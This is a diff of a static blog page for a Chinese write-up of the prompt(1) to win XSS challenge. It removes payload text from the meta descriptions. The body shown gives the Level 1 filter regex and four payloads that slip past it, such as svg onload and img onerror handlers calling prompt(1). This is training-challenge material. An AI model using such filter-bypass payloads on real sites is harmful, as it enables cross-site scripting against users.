@@ -90,17 +90,17 @@
 
 
 
-<meta name="description" content="Prompt(1)Prompt(1) to win XSS挑战赛的灵感来源于alert(1) to win。名字相似，内容却有不一样的精彩。 Prompt(1) 挑战赛Level 1regex: /&amp;lt;\/?[^&amp;gt;]+&amp;gt;/gi过滤点: &amp;lt;任意内容&amp;gt;Payload:1234&amp;lt;svg/onload=prompt(1) &amp;lt;svg/onload=prompt(1)">
+<meta name="description" content="Prompt(1)Prompt(1) to win XSS挑战赛的灵感来源于alert(1) to win。名字相似，内容却有不一样的精彩。">
 <meta name="keywords" content="xss">
 <meta property="og:type" content="article">
 <meta property="og:title" content="深入xss-prompt(1)挑战">
 <meta property="og:url" content="/2017/05/20/深入xss-prompt-1-挑战/index.html">
 <meta property="og:site_name" content="Glad2metU">
-<meta property="og:description" content="Prompt(1)Prompt(1) to win XSS挑战赛的灵感来源于alert(1) to win。名字相似，内容却有不一样的精彩。 Prompt(1) 挑战赛Level 1regex: /&amp;lt;\/?[^&amp;gt;]+&amp;gt;/gi过滤点: &amp;lt;任意内容&amp;gt;Payload:1234&amp;lt;svg/onload=prompt(1) &amp;lt;svg/onload=prompt(1)">
-<meta property="og:updated_time" content="2017-05-20T10:02:32.000Z">
+<meta property="og:description" content="Prompt(1)Prompt(1) to win XSS挑战赛的灵感来源于alert(1) to win。名字相似，内容却有不一样的精彩。">
+<meta property="og:updated_time" content="2017-05-20T10:06:20.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="深入xss-prompt(1)挑战">
-<meta name="twitter:description" content="Prompt(1)Prompt(1) to win XSS挑战赛的灵感来源于alert(1) to win。名字相似，内容却有不一样的精彩。 Prompt(1) 挑战赛Level 1regex: /&amp;lt;\/?[^&amp;gt;]+&amp;gt;/gi过滤点: &amp;lt;任意内容&amp;gt;Payload:1234&amp;lt;svg/onload=prompt(1) &amp;lt;svg/onload=prompt(1)">
+<meta name="twitter:description" content="Prompt(1)Prompt(1) to win XSS挑战赛的灵感来源于alert(1) to win。名字相似，内容却有不一样的精彩。">
 
 
 
@@ -381,6 +381,7 @@
 
       
         <h3 id="Prompt-1"><a href="#Prompt-1" class="headerlink" title="Prompt(1)"></a>Prompt(1)</h3><p><em>Prompt(1) to win XSS挑战赛的灵感来源于alert(1) to win。名字相似，内容却有不一样的精彩。</em></p>
+<a id="more"></a>
 <p><a href="http://prompt.ml/1" target="_blank" rel="external">Prompt(1)</a></p>
 <h3 id="挑战赛"><a href="#挑战赛" class="headerlink" title="挑战赛"></a>挑战赛</h3><h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h4><p><em>regex:</em> <code>/&lt;\/?[^&gt;]+&gt;/gi</code><br><em>过滤点:</em> <code>&lt;任意内容&gt;</code><br><em>Payload:</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;svg/onload=prompt(1) </div><div class="line">&lt;svg/onload=prompt(1)//</div><div class="line">&lt;img src=1 onerror=prompt(1)  </div><div class="line">&lt;img src=1 onerror=prompt(1)//</div></pre></td></tr></table></figure></p>
 <p><em>Talk</em>: <code>Payload中的1和3末尾需跟换行或者空白符</code> </p>
